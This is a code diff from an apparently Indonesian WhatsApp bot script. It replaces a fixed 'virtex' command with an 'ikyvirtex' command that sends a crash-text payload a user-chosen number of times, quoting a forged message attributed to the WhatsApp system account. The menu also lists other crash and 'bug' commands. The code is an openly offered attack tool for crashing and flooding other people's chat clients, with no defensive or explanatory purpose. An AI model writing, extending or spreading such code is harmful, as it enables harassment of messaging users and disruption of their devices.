@@ -4321,6 +4321,7 @@ jobotz.sendMessage(m.chat, {audio: fs.readFileSync('./src/iky1.mp3'), mimetype: 
 │⌲ ${prefix}ikycrashemoji
 │⌲ ${prefix}ikycrashtitik
 │⌲ ${prefix}ikythemonster
+│⌲ ${prefix}ikyvirtex (jumlah) 
 │⌲ ${prefix}ikybug1 (jumlah)
 │⌲ ${prefix}ikybug2 (jumlah) 
 │⌲ ${prefix}ikybug3 (jumlah)
@@ -7470,38 +7471,6 @@ await jobotz.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:asukonyol11})
  jancok(`🚀🔥`)
  }
  break
- case 'virtex': {
- if (!isCreator && !isBan) return
-   asukonyol11 = { 
-   key: { 
-   fromMe: false, 
-   participant: `0@s.whatsapp.net`, 
- ...({ remoteJid: "" }) 
-  }, 
-  message: { 
- "imageMessage": { 
- "mimetype": "image/jpeg", 
- "caption": `IKY VIRTEX`,
- "jpegThumbnail": virgam
- } 
- } 
- }
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"${virtex}"},{quoted:asukonyol11})
-await jobotz.sendMessage(m.chat, {text:"CRASH!!!"},{quoted:asukonyol11})
- }
- break
  case 'itzmeiky': {            
 if (!isCreator && !isBan) return
 if (args.length == 0) return m.reply(`Jumlahnya?`)
@@ -7561,6 +7530,32 @@ for (let i = 0; i < jumlah; i++) {
 await jobotz.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
 }
 jancok(`Sukses Send bug Sebanyak ${jumlah}`)
+}
+            break
+case 'ikyvirtex': {            
+if (!isCreator && !isBan) return
+if (args.length == 0) return m.reply(`Jumlahnya?`)
+jumlah = `${encodeURI(q)}`
+for (let i = 0; i < jumlah; i++) {
+             teng = `
+${virtex}
+`
+             asukonyol11 = { 
+                    key: { 
+                        fromMe: false, 
+                        participant: `0@s.whatsapp.net`, 
+                        ...({ remoteJid: "" }) 
+                    }, 
+                    message: { 
+                        "imageMessage": { 
+                            "mimetype": "image/jpeg", 
+                            "caption": `THE IKYY VIRTEX`,
+                            "jpegThumbnail": virgam
+                        } 
+                    } 
+                }
+await jobotz.sendMessage(m.chat, {text:teng},{quoted:asukonyol11})
+}
 }
             break
 
